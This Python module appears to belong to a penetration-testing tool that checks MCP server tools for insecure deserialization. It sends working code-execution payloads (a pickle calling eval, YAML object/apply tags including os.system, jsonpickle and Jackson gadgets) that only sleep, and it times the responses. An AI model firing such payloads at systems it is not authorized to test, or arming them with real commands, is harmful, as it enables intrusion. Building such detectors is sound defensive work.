"""Insecure deserialization tests for MCP tools"""
import base64
import time


class DeserializationTest:
    """Test for insecure deserialization vulnerabilities"""
    
    def __init__(self, pentester):
        self.pentester = pentester
    
    def _generate_valid_payload(self, tool, override_args=None):
        """Generate schema-compliant payloads"""
        override_args = override_args or {}
        schema = tool.get('inputSchema', {})
        args = {}
        
        for prop, spec in schema.get('properties', {}).items():
            if prop in override_args:
                args[prop] = override_args[prop]
            elif spec.get('type') == 'string':
                args[prop] = "test"
            elif spec.get('type') in ['integer', 'number']:
                args[prop] = 1
            elif spec.get('type') == 'boolean':
                args[prop] = True
        return {"name": tool['name'], "arguments": args}
    
    def run(self, tool):
        """Test for deserialization vulnerabilities"""
        self.pentester.health_check()
        findings = []
        schema = tool.get('inputSchema', {})
        
        for arg, spec in schema.get('properties', {}).items():
            if spec.get('type') == 'string':
                desc = spec.get('description', '').lower()
                name = arg.lower()
                is_suspicious = any(k in name or k in desc for k in 
                    ['base64', 'token', 'state', 'data', 'obj', 'key', 'payload', 'serial'])
                
                findings.extend(self._test_yaml(tool, arg))
                findings.extend(self._test_json_gadgets(tool, arg))
                
                if is_suspicious:
                    findings.extend(self._test_pickle(tool, arg))
        
        return findings
    
    def _test_pickle(self, tool, arg):
        findings = []
        # Time-based blind RCE: __import__('time').sleep(4)
        blind_payload = base64.b64encode(
            b'\x80\x03cbuiltins\neval\nX\x1c\x00\x00\x00__import__("time").sleep(4)\x85R.'
        ).decode()
        
        try:
            params = self._generate_valid_payload(tool, {arg: blind_payload})
            start = time.time()
            self.pentester.send("tools/call", params)
            duration = time.time() - start
            
            if duration > 3.5:
                findings.append({
                    'type': 'PICKLE_DESERIALIZATION_BLIND',
                    'tool': tool['name'],
                    'arg': arg,
                    'severity': 'CRITICAL',
                    'note': f'Execution delayed {duration:.2f}s (sleep payload)'
                })
        except Exception:
            pass
        
        return findings
    
    def _test_yaml(self, tool, arg):
        findings = []
        payloads = [
            "!!python/object/apply:time.sleep [4]",
            "!!python/object/apply:os.system ['sleep 4']",
        ]
        
        for payload in payloads:
            try:
                params = self._generate_valid_payload(tool, {arg: payload})
                start = time.time()
                resp, _ = self.pentester.send("tools/call", params)
                duration = time.time() - start
                
                if duration > 3.5:
                    findings.append({
                        'type': 'YAML_DESERIALIZATION',
                        'tool': tool['name'],
                        'arg': arg,
                        'severity': 'CRITICAL',
                        'note': f'Server slept {duration:.2f}s'
                    })
                    break
                
                if resp and 'ConstructorError' in str(resp):
                    findings.append({
                        'type': 'YAML_UNSAFE_LOAD_HINT',
                        'tool': tool['name'],
                        'arg': arg,
                        'severity': 'MEDIUM',
                        'note': 'YAML parsing detected'
                    })
            except Exception:
                pass
        return findings
    
    def _test_json_gadgets(self, tool, arg):
        findings = []
        gadgets = [
            '{"py/object": "time.sleep", "py/arg": 4}',  # jsonpickle
            '{"py/reduce": [{"py/type": "time.sleep"}, {"py/tuple": [4]}]}',
            '{"@type":"java.lang.Runtime"}',  # Jackson
        ]
        
        for payload in gadgets:
            try:
                params = self._generate_valid_payload(tool, {arg: payload})
                start = time.time()
                resp, _ = self.pentester.send("tools/call", params)
                duration = time.time() - start
                
                if duration > 3.5:
                    findings.append({
                        'type': 'JSON_GADGET_RCE',
                        'tool': tool['name'],
                        'arg': arg,
                        'severity': 'CRITICAL',
                        'note': f'jsonpickle/gadget executed ({duration:.2f}s)'
                    })
                    break
                
                content = str(resp)
                if any(ind in content for ind in ['ClassNotFoundException', 'autoType', 'py/object']):
                    findings.append({
                        'type': 'JSON_GADGET_PARSED',
                        'tool': tool['name'],
                        'arg': arg,
                        'severity': 'HIGH',
                        'note': 'Type hint processed'
                    })
            except Exception:
                pass
        return findings
